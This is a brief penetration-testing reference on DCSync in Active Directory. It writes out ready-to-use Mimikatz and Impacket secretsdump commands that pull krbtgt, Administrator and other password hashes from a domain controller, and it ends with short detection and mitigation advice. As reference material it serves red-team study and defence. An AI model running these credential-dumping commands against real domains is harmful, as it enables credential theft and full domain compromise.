# DCSync
**What:** Use Directory Replication API (MS-DRS) to request credential data (including NTLM hashes) from a Domain Controller as if you were a DC. Very powerful — can retrieve krbtgt and many account hashes.  
**Privileges needed:** Account must have `Replicating Directory Changes` / `Replicating Directory Changes All` or specific rights like `DS-Replication-Get-Changes` (often domain admin or accounts with replication rights).  
**Common tools:** Mimikatz `lsadump::dcsync`, Impacket `secretsdump.py` (when used with DCSync-capable account).
## Mimikatz (DCSync for krbtgt)

```bash
# in mimikatz (elevated)
privilege::debug lsadump::dcsync /domain:corp.local /user:krbtgt 
# or for a specific user 
lsadump::dcsync /domain:corp.local /user:Administrator
```

## Impacket secretsdump (DCSync-like retrieval when auth'd)

-  If you have an account with rights to replicate, secretsdump can be used to pull hashes from the DC:

```bash
 python3 /path/to/impacket/examples/secretsdump.py DOMAIN/replicator@10.0.0.1 
 
 # Or using an NTLM hash for the replicator account: 
 python3 /path/to/impacket/examples/secretsdump.py DOMAIN/replicator@10.0.0.1 -hashes :<NTLM_HASH>
 
```

**Detection / Mitigation**

- Detections: monitor for replication API usage from non-DC hosts, unusual LDAP/DRS calls, or events indicating `DS-Replication` activity from non-authorized principals.
    
- Mitigate by tightly controlling `Replicating Directory Changes` rights, auditing delegation/ACLs, and restricting which accounts can replicate directory data. Regularly rotate `krbtgt` (with care and planned steps) if compromise suspected.
